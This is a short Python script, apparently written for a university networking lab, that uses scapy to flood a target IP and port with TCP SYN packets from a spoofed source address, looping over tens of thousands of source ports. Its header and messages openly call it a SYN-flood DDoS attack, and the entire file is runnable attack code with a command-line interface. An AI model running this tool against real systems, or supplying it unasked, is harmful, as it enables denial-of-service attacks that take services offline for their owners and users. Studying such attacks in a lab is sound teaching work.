"""
    SYN-Flooder DDoS attack
    Realisation du TP reseau (Pr.EL GHOLAMI Khalid)

    Realise par: Mehdi El-HAIJ

Usage:
  synflood.py <ip_source> <ip_destination> <port_destination>

Options:
  -h, --help            Show this screen.
  --version             Show version.
"""

from docopt import docopt
import logging
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


def main(arguments):
    src_ip = arguments["<ip_source>"]
    dst_ip = arguments["<ip_destination>"]
    dst_port = int(arguments["<port_destination>"])

    print("\n###########################################")
    print("# Demarage d'attack DDOS SYN-FLOOD...")
    print("###########################################\n")

    for src_port in range(1024, 65535): # changer l'ip source
        print("[+] Envoyer des paquets SYN de %s:%s" % (src_ip, src_port))

        # La creatio du paquets
        network_layer = IP(src=src_ip, dst=dst_ip)
        transport_layer = TCP(sport=src_port, dport=dst_port, flags="S")

        # Envoye du paquet
        send(network_layer / transport_layer, verbose=False)


    print("[+] bye.")


if __name__ == '__main__':
    arguments = docopt(__doc__, version="ENSAK SYN-FLOODER v ALPHA")
    main(arguments)
